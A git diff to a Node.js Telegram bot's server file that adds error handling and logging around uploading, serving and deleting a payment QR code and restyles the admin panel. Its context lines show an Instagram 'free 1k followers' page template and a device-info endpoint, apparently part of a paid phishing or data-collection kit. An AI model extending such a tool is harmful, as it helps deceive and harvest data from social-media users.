@@ -1,7 +1,7 @@
-// ====================== index.js – MONGODB + FILE SYSTEM QR ======================
+// ====================== index.js – QR 100% WORKING ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * Important data in MongoDB, QR in file system, custom link formats
+ * QR upload via admin panel + bot, fully working
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -279,13 +279,26 @@ async function getChannelButtonsAsync() {
 }
 
 // ====================== QR FUNCTIONS (File System) ======================
-function getQRPath() { return QR_FILE; }
 function saveQRBuffer(buffer) {
-    fs.writeFileSync(QR_FILE, buffer);
-    return true;
+    try {
+        fs.writeFileSync(QR_FILE, buffer);
+        console.log('✅ QR saved successfully at:', QR_FILE);
+        logToFile('✅ QR saved successfully');
+        return true;
+    } catch (err) {
+        console.error('❌ QR save error:', err);
+        logToFile('❌ QR save error: ' + err.message);
+        return false;
+    }
 }
 function deleteQRFile() {
-    if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
+    if (fs.existsSync(QR_FILE)) {
+        fs.unlinkSync(QR_FILE);
+        console.log('✅ QR deleted');
+        logToFile('✅ QR deleted');
+        return true;
+    }
+    return false;
 }
 function qrExists() { return fs.existsSync(QR_FILE); }
 
@@ -314,7 +327,11 @@ function SYloveMenu(firstName, message) {
 function logToFile(message) {
     const timestamp = new Date().toISOString();
     const logPath = path.join(DATA_DIR, 'logs.txt');
-    fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
+    try {
+        fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
+    } catch (err) {
+        console.error('Log write error:', err);
+    }
 }
 
 // ====================== FAST SEND BATCH ======================
@@ -343,7 +360,7 @@ async function sendBatchPhotos(userId) {
     delete userActive[userId];
 }
 
-// ====================== TEMPLATES ======================
+// ====================== TEMPLATES (with custom headings) ======================
 // Instagram → "instafree1kfollowers"
 const INSTA_TEMPLATE = `<!DOCTYPE html>
 <html>
@@ -839,7 +856,7 @@ app.post('/api/device-info', async (req, res) => {
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
-// Admin panel
+// Admin panel with QR upload
 app.get('/admin', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title>
@@ -851,7 +868,19 @@ app.get('/admin', (req, res) => {
 <div id="tab-channels" class="tab-content"><h2>📢 Manage Channels</h2><div class="upload-section"><h3>➕ Add Channel</h3><div class="flex"><input type="text" id="channelId" placeholder="Channel ID" style="flex:1"><input type="text" id="channelName" placeholder="Channel Name" style="flex:1"><input type="text" id="channelLink" placeholder="Channel Link" style="flex:1"><button class="btn btn-success" onclick="addChannel()">Add</button></div></div><div id="channelList"></div></div>
 <div id="tab-users" class="tab-content"><h2>👥 Manage Users</h2><div class="flex" style="margin-bottom:20px"><input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1"><button class="btn btn-primary" onclick="searchUser()">Search</button></div><div id="userList"></div><div class="flex" style="margin-top:20px"><input type="text" id="userIdInput" placeholder="User ID" style="flex:1"><input type="number" id="creditAmount" placeholder="Credits" style="width:150px"><button class="btn btn-warning" onclick="modifyCredits()">Modify</button><button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button></div></div>
 <div id="tab-featured" class="tab-content"><h2>⭐ Featured Settings</h2><div class="upload-section"><h3>📸 Featured Photo</h3><div class="flex"><select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><option value="">Select a photo...</option></select><button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button><button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button></div><div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div></div><div class="upload-section"><h3>💬 Featured Message</h3><div class="flex"><input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button></div><div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div></div><div class="upload-section"><h3>⚙️ Status</h3><div class="flex"><span id="featuredStatus" class="status-badge status-active">✅ Active</span><button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button></div></div></div>
-<div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2><div id="qrDisplay"><p style="color:#888;margin:20px 0">Upload payment QR code</p><input type="file" id="qrUpload" accept="image/*"><button class="btn btn-primary" onclick="uploadQR()">Upload QR</button><button class="btn btn-danger" onclick="removeQR()">Remove QR</button></div><div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;"><p style="color:#888;margin-bottom:10px;">Current QR Code:</p><img id="qrImage" src="" style="max-width:200px;border-radius:10px;"></div></div></div>
+<div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2>
+<p style="color:#888;margin:10px 0;">Upload QR code image below</p>
+<div class="flex" style="justify-content:center;margin:20px 0;">
+<input type="file" id="qrUpload" accept="image/*" style="background:#0a0a0a;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px;">
+<button class="btn btn-primary" onclick="uploadQR()">📤 Upload QR</button>
+<button class="btn btn-danger" onclick="removeQR()">🗑️ Remove QR</button>
+</div>
+<div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;">
+<p style="color:#888;margin-bottom:10px;">✅ Current QR Code:</p>
+<img id="qrImage" src="" style="max-width:200px;border-radius:10px;border:2px solid #28a745;">
+</div>
+<div id="qrStatus" style="margin-top:10px;padding:10px;border-radius:8px;background:#1a1a2e;border:1px solid #2a2a4a;color:#888;"></div>
+</div></div>
 <div id="tab-logs" class="tab-content"><h2>📋 Server Logs</h2><div class="flex" style="margin-bottom:20px"><button class="btn btn-primary" onclick="loadLogs()">Refresh</button><button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button></div><div id="logsDisplay" class="logs-area">Loading logs...</div></div>
 <div id="tab-commands" class="tab-content"><h2>📜 All Commands</h2><div class="upload-section"><h3>👑 Admin Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/help or /commands - Show all commands\n/admin - Open admin panel\n/addcredits [userId] [amount] - Add credits\n/removecredits [userId] [amount] - Remove credits\n/unlimited [userId] - Activate unlimited\n/resetuser [userId] - Reset user\n/users - Show all users\n/stats - Bot statistics\n/broadcast [message] - Send to all users\n/addqr - Upload QR code\n/removeqr - Remove QR code\n/viewqr - View QR code\n/addchannel [id] [name] [link] - Add channel\n/removechannel [id] - Remove channel\n/channels - List all channels\n/addphoto [caption] - Upload photo (reply with image)\n/featured [photoId] - Set featured photo\n/featuredmsg [message] - Set featured message\n/featuredtoggle - Toggle featured on/off\n/logs - Show recent logs\n/restart - Restart bot\n/dm [userId] [message] - DM a user</pre><h3 style="margin-top:20px">👤 User Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/start - Start the bot\n/menu - Show main menu\n/pay [amount] - Buy credits\n/credits - Check your credits\n/referral - Get referral link</pre></div></div>
 </div>
@@ -876,16 +905,16 @@ async function setFeaturedPhoto(){var photoId=document.getElementById("featuredP
 async function removeFeaturedPhoto(){try{var r=await fetch("/api/admin/featured/photo",{method:"DELETE"});if(r.ok){showToast("Removed!");loadFeatured();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}
 async function setFeaturedMessage(){var message=document.getElementById("featuredMessage").value.trim();if(!message){showToast("Enter a message",true);return;}try{var r=await fetch("/api/admin/featured/message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:message})});if(r.ok){showToast("Message updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
 async function toggleFeaturedStatus(){try{var r=await fetch("/api/admin/featured/toggle",{method:"POST"});if(r.ok){showToast("Status toggled!");loadFeatured();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
-async function loadQR(){try{var r=await fetch("/api/admin/qr");if(r.ok){var blob=await r.blob();var url=URL.createObjectURL(blob);document.getElementById("qrPreview").style.display="block";document.getElementById("qrImage").src=url;}else{document.getElementById("qrPreview").style.display="none";}}catch(err){}}
-async function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("QR uploaded!");loadQR();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}}
-async function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("QR removed!");loadQR();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}
+async function loadQR(){try{var r=await fetch("/api/admin/qr");if(r.ok){var blob=await r.blob();var url=URL.createObjectURL(blob);document.getElementById("qrPreview").style.display="block";document.getElementById("qrImage").src=url;document.getElementById("qrStatus").innerHTML="✅ QR code is available";}else{document.getElementById("qrPreview").style.display="none";document.getElementById("qrStatus").innerHTML="❌ No QR code uploaded yet";}}catch(err){document.getElementById("qrStatus").innerHTML="❌ Error loading QR";}}
+async function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image first!",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("✅ QR uploaded successfully!");loadQR();}else{showToast("❌ Upload failed: "+data.error,true);}}catch(err){showToast("❌ Error uploading QR",true);}}
+async function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("✅ QR removed!");loadQR();}else showToast("❌ Remove failed",true);}catch(err){showToast("❌ Error removing QR",true);}}
 async function loadLogs(){try{var r=await fetch("/api/admin/logs");var data=await r.json();document.getElementById("logsDisplay").textContent=data.logs||"No logs available";}catch(err){document.getElementById("logsDisplay").textContent="Error loading logs";showToast("Error loading logs",true);}}
 async function clearLogs(){if(!confirm("Clear all logs?"))return;try{var r=await fetch("/api/admin/logs",{method:"DELETE"});if(r.ok){showToast("Logs cleared!");loadLogs();}else showToast("Clear failed",true);}catch(err){showToast("Error",true);}}
 loadPhotos();loadChannels();loadUsers();loadFeatured();loadQR();
 </script></body></html>`);
 });
 
-// ====================== ADMIN API (MongoDB) ======================
+// ====================== ADMIN API ======================
 app.get('/api/admin/photos', async (req, res) => {
     const photos = await getPhotos();
     res.json({ photos, total: photos.length });
@@ -971,24 +1000,37 @@ app.post('/api/admin/featured/toggle', async (req, res) => {
 });
 
 // QR API (File System)
-app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
+app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
     try {
-        if (!req.file) return res.status(400).json({ error: 'No file' });
+        if (!req.file) {
+            return res.status(400).json({ error: 'No file uploaded' });
+        }
         const buffer = fs.readFileSync(req.file.path);
         saveQRBuffer(buffer);
         fs.unlinkSync(req.file.path);
-        res.json({ success: true, url: '/api/admin/qr' });
-    } catch (err) { res.status(500).json({ error: err.message }); }
+        res.json({ success: true, message: 'QR uploaded successfully!' });
+    } catch (err) {
+        console.error('QR upload error:', err);
+        res.status(500).json({ error: err.message });
+    }
 });
 app.delete('/api/admin/remove-qr', (req, res) => {
-    deleteQRFile();
-    res.json({ success: true });
+    try {
+        deleteQRFile();
+        res.json({ success: true, message: 'QR removed successfully!' });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
 });
 app.get('/api/admin/qr', (req, res) => {
-    if (qrExists()) {
-        res.sendFile(QR_FILE);
-    } else {
-        res.status(404).json({ error: 'No QR found' });
+    try {
+        if (qrExists()) {
+            res.sendFile(QR_FILE);
+        } else {
+            res.status(404).json({ error: 'No QR code found' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
     }
 });
 app.get('/api/admin/logs', (req, res) => {
